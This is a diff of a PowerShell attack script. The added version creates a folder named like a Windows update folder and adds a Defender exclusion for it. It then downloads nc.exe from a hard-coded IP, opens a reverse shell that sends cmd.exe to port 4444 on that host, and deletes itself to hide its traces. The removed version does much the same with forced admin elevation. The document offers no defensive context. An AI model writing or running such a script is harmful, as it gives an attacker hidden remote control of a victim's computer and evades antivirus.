@@ -1,19 +1,21 @@
-# Check if script is running with Administrator privileges
-if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
-    [Security.Principal.WindowsBuiltinRole] "Administrator")) {
+# Define temporary folder and executable name
+$TempDir = "$env:TEMP\WinUpdateTemp"
+$NcPath = "$TempDir\nc.exe"
 
-    # Relaunch the script with admin privileges
-    $scriptPath = $MyInvocation.MyCommand.Definition
-    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
-    exit
-}
+# Create the temp folder
+New-Item -ItemType Directory -Force -Path $TempDir | Out-Null
 
-Add-MpPreference -ExclusivePath $env:USERPROFILE\Downloads
-$url = 'http://192.168.0.111/nc.exe'
-$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'nc.exe')
+# Exclude the folder from Defender
+Add-MpPreference -ExclusionPath $TempDir
 
-Start-Sleep -Milliseconds 100
+# Download nc.exe from the server
+Invoke-WebRequest -Uri "http://192.168.0.115/nc.exe" -OutFile $NcPath
 
-Invoke-Webrequest -Uri $url -OutFile $outputFile
+# Run nc.exe to connect to listener
+Start-Process -FilePath $NcPath -ArgumentList "192.168.0.115 4444 -e cmd.exe"
 
-Start-Process -FilePath $outputFile
+# Delete the script after a short delay                                                                   
+Start-Sleep -Seconds 5                                                                                    
+$MyPath = $MyInvocation.MyCommand.Definition                                                              
+Start-Sleep -Milliseconds 500                                                                             
+Remove-Item -Path $MyPath -Force
